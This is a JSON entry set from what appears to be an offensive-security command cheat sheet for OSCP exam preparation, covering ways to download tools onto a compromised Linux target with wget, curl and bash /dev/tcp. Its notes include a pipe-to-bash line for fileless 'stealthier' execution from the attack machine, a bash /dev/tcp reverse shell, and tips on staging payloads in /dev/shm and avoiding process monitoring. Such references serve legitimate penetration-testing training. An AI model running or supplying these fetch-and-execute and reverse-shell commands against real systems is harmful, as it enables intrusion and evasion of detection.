{
  "category": "file-transfer",
  "subcategory": "linux-download",
  "description": "File download methods for Linux targets",
  "commands": [
    {
      "id": "ft-wget-download",
      "name": "Linux: wget Download",
      "category": "file-transfer",
      "subcategory": "linux-download",
      "command": "wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>",
      "description": "Download file using wget on Linux target (ubiquitous, reliable)",
      "tags": [
        "FILE_TRANSFER",
        "LINUX",
        "DOWNLOAD",
        "WGET",
        "OSCP:HIGH",
        "QUICK_WIN"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download from server",
          "example": "linpeas.sh",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Destination filename (optional, defaults to <FILE>)",
          "example": "/tmp/linpeas.sh",
          "required": false
        }
      ],
      "flag_explanations": {
        "-O": "Output filename - use capital O to specify destination. Lowercase -o saves log output",
        "-q": "Quiet mode - suppress wget progress output, useful in scripts or low-bandwidth shells",
        "--no-check-certificate": "Skip SSL certificate validation - use for HTTPS with self-signed certs",
        "-P <DIR>": "Download to directory - alternative to -O, saves file with original name in specified directory",
        "-r": "Recursive download - download entire directory structure (rarely needed in OSCP)",
        "-b": "Background download - continues in background, useful for large files or unstable shells"
      },
      "success_indicators": [
        "HTTP request sent, awaiting response... 200 OK",
        "Length: <SIZE> (<SIZE_HR>) [<TYPE>]",
        "100% ... saved [<SIZE>/<SIZE>]",
        "File exists: ls -la <OUTPUT>"
      ],
      "failure_indicators": [
        "wget: command not found - use curl alternative",
        "404 Not Found - wrong filename or path",
        "Connection refused - wrong IP/port or firewall",
        "No route to host - network connectivity issue"
      ],
      "troubleshooting": {
        "wget not found": "Use alternative: ft-curl-download or ft-bash-dev-tcp",
        "SSL certificate problem": "Add --no-check-certificate flag for HTTPS",
        "Connection timeout": "Check firewall allows outbound HTTP, verify with: nc -zv <LHOST> <PORT>",
        "Cannot write file": "Check permissions: ls -la /tmp, try different directory: /dev/shm/, /var/tmp/",
        "File incomplete": "Resume download: wget -c http://<URL> (continues from where it stopped)"
      },
      "prerequisites": [
        "ft-python-http-server"
      ],
      "alternatives": [
        "ft-curl-download",
        "ft-bash-dev-tcp"
      ],
      "next_steps": [
        "chmod-executable"
      ],
      "notes": "OSCP METHODOLOGY: First choice for Linux downloads - installed on 99% of systems. Shows progress bar (helpful for large files), auto-retries on failure, supports resume.\n\nMANUAL ALTERNATIVE: Could use browser if GUI access available, or manual HTTP GET via netcat, but wget is almost always available.\n\nEXAM TIP: After download, check file integrity: md5sum <FILE> and compare with source. Make scripts executable: chmod +x <FILE>. If wget unavailable, immediately try curl.\n\nCOMMON DESTINATIONS: /tmp/ (world writable but cleared on reboot), /dev/shm/ (RAM disk, fast), /var/tmp/ (persistent), current directory if writable.\n\nWGET VS CURL: wget is simpler for basic downloads, shows progress, handles recursive downloads better. curl has more features but complex syntax.\n\nTIME ESTIMATE: Near-instant for scripts under 1MB, shows real-time progress for larger files.",
      "oscp_relevance": "high"
    },
    {
      "id": "ft-curl-download",
      "name": "Linux: curl Download",
      "category": "file-transfer",
      "subcategory": "linux-download",
      "command": "curl http://<LHOST>:<PORT>/<FILE> -o <OUTPUT>",
      "description": "Download file using curl on Linux target (alternative to wget)",
      "tags": [
        "FILE_TRANSFER",
        "LINUX",
        "DOWNLOAD",
        "CURL",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "exploit.sh",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Destination filename",
          "example": "/tmp/exploit.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-o": "Output filename - lowercase o for curl (vs capital O for wget)",
        "-O": "Use remote filename - saves with same name as on server, useful when URL has clear filename",
        "-k": "Allow insecure SSL connections - skip certificate validation for HTTPS with self-signed certs",
        "-s": "Silent mode - suppress progress meter and errors, useful in scripts",
        "-L": "Follow redirects - essential if URL redirects (HTTP 301/302), curl doesn't follow by default",
        "-#": "Show progress bar - alternative to default progress meter, cleaner for scripts"
      },
      "success_indicators": [
        "Progress bar reaches 100%",
        "Exit code 0: echo $?",
        "File exists: ls -la <OUTPUT>",
        "File size matches source"
      ],
      "failure_indicators": [
        "curl: command not found - use wget alternative",
        "Failed to connect - wrong IP/port or firewall",
        "404 Not Found - file not on server",
        "SSL certificate problem - add -k flag"
      ],
      "troubleshooting": {
        "curl not found": "Use alternative: ft-wget-download or ft-bash-dev-tcp",
        "SSL certificate error": "Add -k flag: curl -k https://...",
        "No output file created": "Check output path writable, try: /tmp/, /dev/shm/",
        "Connection timeout": "Verify connectivity: curl -I http://<LHOST>:<PORT> (HEAD request)",
        "Redirect not followed": "Add -L flag to follow 301/302 redirects"
      },
      "prerequisites": [
        "ft-python-http-server"
      ],
      "alternatives": [
        "ft-wget-download",
        "ft-bash-dev-tcp"
      ],
      "next_steps": [
        "ft-curl-upload"
      ],
      "notes": "OSCP METHODOLOGY: Second choice for Linux downloads when wget unavailable. More verbose by default but powerful. Available on most modern Linux systems alongside wget.\n\nMANUAL ALTERNATIVE: Could manually construct HTTP GET via netcat or telnet, but curl is almost always available.\n\nCURL VS WGET: curl supports more protocols (HTTP, HTTPS, FTP, SCP, etc.) and has more advanced features, but syntax is more complex. Use curl if you need specific HTTP headers or authentication.\n\nEXAM TIP: Remember lowercase -o for curl (uppercase -O uses remote filename). Add -s for silent mode in scripts. For piped execution: curl http://<IP>/script.sh | bash\n\nIN-MEMORY EXECUTION: Download and execute without saving: curl http://<IP>/script.sh | bash (stealthier, no disk artifacts)\n\nTIME ESTIMATE: Comparable to wget, instant for small files, shows progress for large downloads.",
      "oscp_relevance": "high"
    },
    {
      "id": "ft-bash-dev-tcp",
      "name": "Linux: Bash /dev/tcp Download",
      "category": "file-transfer",
      "subcategory": "linux-download",
      "command": "cat < /dev/tcp/<LHOST>/<PORT> > <OUTPUT>",
      "description": "Download file using bash pseudo-device (no external tools needed)",
      "tags": [
        "FILE_TRANSFER",
        "LINUX",
        "DOWNLOAD",
        "BASH",
        "OSCP:MEDIUM",
        "LIVING_OFF_THE_LAND"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Port with netcat listener serving file",
          "example": "4444",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Destination filename",
          "example": "/tmp/file",
          "required": true
        }
      ],
      "flag_explanations": {
        "/dev/tcp/<IP>/<PORT>": "Bash pseudo-device - creates TCP connection to IP:PORT. Built into bash, no external commands needed",
        "cat <": "Read from TCP connection - receives data from pseudo-device",
        "> <OUTPUT>": "Redirect to file - saves received data to specified file",
        "/dev/udp/<IP>/<PORT>": "Alternative for UDP connections - less common but available"
      },
      "success_indicators": [
        "File created: ls -la <OUTPUT>",
        "File size matches source",
        "No error output from cat"
      ],
      "failure_indicators": [
        "/dev/tcp: No such file or directory - bash compiled without /dev/tcp support",
        "Connection refused - no listener on target port",
        "cat: write error: No space left on device"
      ],
      "troubleshooting": {
        "/dev/tcp not available": "Bash compiled with --disable-net-redirections. Use alternative: ft-wget-download or ft-curl-download",
        "Connection refused": "Ensure netcat listener running: nc -lvnp <PORT> < file on attack machine",
        "File empty or incomplete": "Restart listener and transfer. Add sleep: (sleep 1; cat < /dev/tcp/<IP>/<PORT>) > file",
        "Permission denied": "Check output directory writable, try /tmp/ or /dev/shm/"
      },
      "prerequisites": [
        "ft-nc-send"
      ],
      "alternatives": [
        "ft-wget-download",
        "ft-curl-download"
      ],
      "next_steps": [
        "bash-reverse-shell"
      ],
      "notes": "OSCP METHODOLOGY: Last resort for downloads when wget, curl, nc all unavailable or blocked. Uses bash built-in TCP capabilities - no external commands executed, harder to detect in process monitoring.\n\nMANUAL ALTERNATIVE: Could use telnet or other network tools, but /dev/tcp is pure bash.\n\nWHEN TO USE: Extremely restricted environments where all download tools removed/blocked. Relies only on bash and cat (core utilities).\n\nEXAM TIP: On attack machine, use netcat to serve file: nc -lvnp <PORT> < file. On target, immediately run this command. Connection is one-shot - closes after transfer. Check file integrity with md5sum.\n\nLIMITATIONS: No error handling, no resume capability, requires bash (not sh/dash). Some bash builds lack /dev/tcp support (compile-time option).\n\nREVERSE SHELLS: Same technique for shells: bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\n\nTIME ESTIMATE: Instant for small files, but no progress indication. File appears when complete.",
      "oscp_relevance": "medium"
    }
  ]
}
